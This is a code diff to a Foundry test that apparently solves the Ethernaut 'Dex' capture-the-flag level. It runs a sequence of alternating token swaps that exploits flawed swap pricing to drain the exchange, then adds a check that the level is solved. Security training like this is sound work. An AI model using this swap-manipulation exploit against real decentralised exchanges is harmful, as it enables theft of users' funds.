@@ -10,6 +10,7 @@ contract DexTest is Test {
     Ethernaut public ethernaut;
     DexFactory public dexFactory;
     Dex public dex;
+    address internal levelAddr;
 
     address attacker = address(0x1);
 
@@ -21,7 +22,7 @@ contract DexTest is Test {
         ethernaut.registerLevel(dexFactory);
 
         vm.startPrank(attacker);
-        address levelAddr = ethernaut.createLevelInstance(dexFactory);
+        levelAddr = ethernaut.createLevelInstance(dexFactory);
         dex = Dex(payable(levelAddr));
     }
 
@@ -30,12 +31,14 @@ contract DexTest is Test {
         address token2 = dex.token2();
 
         dex.approve(address(dex), 100);
-
         dex.swap(token1, token2, 10);
         dex.swap(token2, token1, 20);
         dex.swap(token1, token2, 24);
         dex.swap(token2, token1, 30);
         dex.swap(token1, token2, 41);
         dex.swap(token2, token1, 45);
+
+        bool success = ethernaut.submitLevelInstance(payable(levelAddr));
+        assertTrue(success, "Solution is not solving the level");
     }
 }
